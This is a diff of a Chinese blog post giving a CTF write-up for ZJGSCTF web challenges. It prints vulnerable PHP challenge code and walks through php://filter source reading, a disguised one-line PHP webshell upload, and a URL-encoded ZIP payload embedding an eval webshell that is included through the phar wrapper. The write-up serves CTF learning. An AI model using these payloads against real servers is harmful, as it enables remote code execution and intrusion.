@@ -12,12 +12,24 @@
 <meta property="og:site_name" content="Err0r">
 <meta property="og:description" content="zjgsctf平台上的部分wp">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://i.imgur.com/CE3G0qc.png">
 <meta property="og:image" content="http://i.imgur.com/5EXKQSk.png">
-<meta property="og:updated_time" content="2017-08-31T12:55:23.178Z">
+<meta property="og:image" content="http://i.imgur.com/VVrETDU.png">
+<meta property="og:image" content="http://i.imgur.com/wddU4Lm.png">
+<meta property="og:image" content="http://i.imgur.com/2TaNg1W.png">
+<meta property="og:image" content="http://i.imgur.com/DiVJUvc.png">
+<meta property="og:image" content="http://i.imgur.com/eDG1cIz.png">
+<meta property="og:image" content="http://i.imgur.com/yHJR0JJ.png">
+<meta property="og:image" content="http://i.imgur.com/4G4cHLd.png">
+<meta property="og:image" content="http://i.imgur.com/lmzdcUa.png">
+<meta property="og:image" content="http://i.imgur.com/9EMFlqS.png">
+<meta property="og:image" content="http://i.imgur.com/V6Ejn4a.png">
+<meta property="og:image" content="http://i.imgur.com/OZX0ArV.png">
+<meta property="og:updated_time" content="2017-09-01T08:28:57.800Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ZJGSCTF">
 <meta name="twitter:description" content="zjgsctf平台上的部分wp">
-<meta name="twitter:image" content="http://i.imgur.com/5EXKQSk.png">
+<meta name="twitter:image" content="http://i.imgur.com/CE3G0qc.png">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -202,7 +214,8 @@
         <p>zjgsctf平台上的部分wp</p>
 <a id="more"></a>
 <h1 id="ZJGSCTF-部分writeup"><a href="#ZJGSCTF-部分writeup" class="headerlink" title="ZJGSCTF 部分writeup"></a>ZJGSCTF 部分writeup</h1><h2 id="哇-黑进服务器"><a href="#哇-黑进服务器" class="headerlink" title="哇 黑进服务器"></a>哇 黑进服务器</h2><p>题目链接：<a href="http://218.76.35.74:20129" target="_blank" rel="external">http://218.76.35.74:20129</a></p>
-<p>进去之后老规矩先右键看源码，提示说，去到include.php之后提示说需要file，应该是文件包含，用filter协议”php://filter/read=convert.base64-encode/resource=”读取upload.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">****upload.php</div><div class="line">&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; </div><div class="line">name=&quot;upload&quot;&gt;file:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br&gt; </div><div class="line">&lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">if(!empty($_FILES[&quot;file&quot;]))</div><div class="line">&#123;</div><div class="line">    echo $_FILES[&quot;file&quot;];</div><div class="line">    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</div><div class="line">    @$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</div><div class="line">    $extension = end($temp);</div><div class="line">    if (((@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</div><div class="line">    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)</div><div class="line">    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</div><div class="line">    &amp;&amp; (@$_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts))</div><div class="line">    &#123;</div><div class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</div><div class="line">        echo &quot;file upload successful!Save in:  &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        echo &quot;upload failed!&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>进去之后老规矩先右键看源码，提示说，去到include.php之后提示说需要file，应该是文件包含，用filter协议<code>&quot;php://filter/read=convert.base64-encode/resource=&quot;</code>读取upload.php<br><img src="http://i.imgur.com/CE3G0qc.png" alt=""></p>
+<p>base64解密之后如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">****upload.php</div><div class="line">&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; </div><div class="line">name=&quot;upload&quot;&gt;file:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br&gt; </div><div class="line">&lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">if(!empty($_FILES[&quot;file&quot;]))</div><div class="line">&#123;</div><div class="line">    echo $_FILES[&quot;file&quot;];</div><div class="line">    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</div><div class="line">    @$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</div><div class="line">    $extension = end($temp);</div><div class="line">    if (((@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</div><div class="line">    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)</div><div class="line">    || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</div><div class="line">    &amp;&amp; (@$_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts))</div><div class="line">    &#123;</div><div class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</div><div class="line">        echo &quot;file upload successful!Save in:  &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        echo &quot;upload failed!&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
 <p>绕过方式很简单，只要后缀是<strong><em>jpg</em></strong>，且content-type是<strong>image/jpeg</strong>即可。</p>
 <ul>
 <li><p>一句话木马如下：</p>
@@ -212,6 +225,35 @@
 </li>
 <li>在include.php页面利用文件包含和phar伪协议来读取jpg中的php文件。如下：<img src="http://i.imgur.com/5EXKQSk.png" alt=""><em>这里一开始没加system，一直不成功</em>。</li>
 <li>然后flag文件藏在哪儿反正我没找到，潘大佬告诉我用find / -name ‘*flag*‘ 这才找到了flag</li>
+</ul>
+<h2 id="登陆有奖-amp-登陆有奖plus"><a href="#登陆有奖-amp-登陆有奖plus" class="headerlink" title="登陆有奖&amp;登陆有奖plus"></a>登陆有奖&amp;登陆有奖plus</h2><p>进去之后看到url里的page就一激灵，八成又是文件包含的题目，还是一样的套路，先试试filter读源码<code>&quot;php://filter/read=convert.base64-encode/resource=&quot;</code><br><img src="http://i.imgur.com/VVrETDU.png" alt=""><br>base64解密出来两个比较重要的页面源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">***index.php</div><div class="line">&lt;?php</div><div class="line">$pwhash=&quot;ffd313052dab00927cb61064a392f30ee454e70f&quot;;</div><div class="line"></div><div class="line">if (@$_GET[&apos;log&apos;]) &#123;</div><div class="line">	if(file_exists($_GET[&apos;log&apos;].&quot;.log&quot;))&#123;</div><div class="line">		include(&quot;flag.txt&quot;);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">if(@$_GET[&apos;page&apos;] != &apos;index&apos;)&#123;</div><div class="line">	include((@$_GET[&apos;page&apos;]?$_GET[&apos;page&apos;].&quot;.php&quot;:&quot;main.php&quot;));</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">***login.php</div><div class="line">&lt;?php</div><div class="line">$login=@$_POST[&apos;login&apos;];</div><div class="line">$password=@$_POST[&apos;password&apos;];</div><div class="line">if(@$login==&quot;admin&quot; &amp;&amp; sha1(@$password)==$pwhash)&#123;</div><div class="line">	include(&apos;flag.txt&apos;);</div><div class="line">&#125;else if (@$login&amp;&amp;@$password&amp;&amp;@$_GET[&apos;debug&apos;]) &#123;</div><div class="line">	echo &quot;Login error, login credentials has been saved to ./log/&quot;.htmlentities($login).&quot;.log&quot;;</div><div class="line">	$logfile = &quot;./log/&quot;.$login.&quot;.log&quot;;</div><div class="line">	file_put_contents($logfile, $login.&quot;\n&quot;.$password);</div><div class="line">&#125; </div><div class="line">?&gt;</div><div class="line">	&lt;center&gt;</div><div class="line">		login&lt;br/&gt;&lt;br/&gt;</div><div class="line">		&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</div><div class="line">			&lt;input name=&quot;login&quot; placeholder=&quot;login&quot;&gt;&lt;br/&gt;</div><div class="line">			&lt;input name=&quot;password&quot; placeholder=&quot;password&quot;&gt;&lt;br/&gt;&lt;br/&gt;</div><div class="line">			&lt;input type=&quot;submit&quot; value=&quot;Go!&quot;&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/center&gt;</div></pre></td></tr></table></figure>
+<p>(虽然有两个include(‘flag.txt’)，感觉方法应该很多，但是我还没搞懂怎么写，希望会的师傅可以私聊告诉我.)</p>
+<p>看login.php里如果url里有debug参数的话，则会将用户名和密码写入到日志里,以’\n’分割。</p>
+<ul>
+<li><p>先想到的是写个php一句话到日志里，然后用文件包含去包含执行php代码<br><img src="http://i.imgur.com/wddU4Lm.png" alt=""><br>至于为什么要写password这个参数，可能是因为Login.php里login出现的比较多，反正两个参数都能写，那就用password好了</p>
+</li>
+<li><p>去看一下写进去的东西<br><img src="http://i.imgur.com/2TaNg1W.png" alt=""><br>看来是写进去了</p>
+</li>
+<li><p>那去包含一下吧<br><img src="http://i.imgur.com/DiVJUvc.png" alt=""><br>好吧，好像失败了。。这里我一开始以为是%00截断后面的’.php’失败了，就用长度截断试了试，也失败了。。</p>
+</li>
+</ul>
+<p>去找一下原因<br><img src="http://i.imgur.com/eDG1cIz.png" alt=""><br>好吧，5.4.16版本，那么高。。<code>%00和长度截断都是要求php版本低于5.3.4，其中%00还需要php的magic_quotes_gpc为OFF状态</code><br>那看来截断不行了，那换个角度试试</p>
+<p>如果想绕过’.php’,可以用<code>zip</code>或者<code>phar</code>,但是这两个协议都需要<strong>压缩包</strong>。既然写一句话木马不行，那写个压缩包进去试试。</p>
+<p>但是还有个问题,login和password之间用’\n’分割，这样会影响压缩包的解压，观察一下压缩包的结构。<br><img src="http://i.imgur.com/yHJR0JJ.png" alt=""><br>能看到有个0A即’\n’,这样就很舒服。</p>
+<ul>
+<li>将十六进制导出，再将空格替换成%<br><img src="http://i.imgur.com/4G4cHLd.png" alt=""></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">login=%50%4b%03%04&amp;password=%00%02%00%00%00%20%b1%0c%4b%e5%4a%ef%5e%1c%00%00%00%1c%00%00%00%05%00%1c%00%63%2e%70%68%70%55%54%09%00%03%fb%0b%8f%59%fb%0b%8f%59%75%78%0b%00%01%04%e8%03%00%00%04%e8%03%00%00%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%52%45%51%55%45%53%54%5b%63%5d%29%3b%3f%3e%0a%50%4b%01%02%1e%03%0a%00%02%00%00%00%20%b1%0c%4b%e5%4a%ef%5e%1c%00%00%00%1c%00%00%00%05%00%18%00%00%00%00%00%01%00%00%00%a4%81%00%00%00%00%63%2e%70%68%70%55%54%05%00%03%fb%0b%8f%59%75%78%0b%00%01%04%e8%03%00%00%04%e8%03%00%00%50%4b%05%06%00%00%00%00%01%00%01%00%4b%00%00%00%5b%00%00%00%00%00</div></pre></td></tr></table></figure>
+<ul>
+<li><p>试试看<img src="http://i.imgur.com/lmzdcUa.png" alt="">这样就可以把完整的压缩包拼凑出来了</p>
+</li>
+<li><p>利用<code>phar</code>协议试试<img src="http://i.imgur.com/9EMFlqS.png" alt=""><br>因为自动加上’.php’，所以其实是phar://./log/文件名.log/c.php，其中c=phpinfo()是传进去的参数</p>
+</li>
+<li><p>上antsword吧(安利一波，很好看),<img src="http://i.imgur.com/V6Ejn4a.png" alt=""><img src="http://i.imgur.com/OZX0ArV.png" alt=""></p>
+</li>
+<li><p>双击打开flag.txt即可</p>
+</li>
 </ul>
 
       
@@ -271,7 +313,7 @@
         <p><span>本文标题:</span><a href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
         <p><span>发布时间:</span>2017年08月31日 - 18时50分</p>
-        <p><span>最后更新:</span>2017年08月31日 - 20时55分</p>
+        <p><span>最后更新:</span>2017年09月01日 - 16时28分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/08/31/ZJGSCTF/" title="ZJGSCTF">http://Err0rzz.github.io/2017/08/31/ZJGSCTF/</a>
             <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/08/31/ZJGSCTF/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -309,7 +351,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJGSCTF-部分writeup"><span class="toc-number">1.</span> <span class="toc-text">ZJGSCTF 部分writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#哇-黑进服务器"><span class="toc-number">1.1.</span> <span class="toc-text">哇 黑进服务器</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJGSCTF-部分writeup"><span class="toc-number">1.</span> <span class="toc-text">ZJGSCTF 部分writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#哇-黑进服务器"><span class="toc-number">1.1.</span> <span class="toc-text">哇 黑进服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登陆有奖-amp-登陆有奖plus"><span class="toc-number">1.2.</span> <span class="toc-text">登陆有奖&登陆有奖plus</span></a></li></ol></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
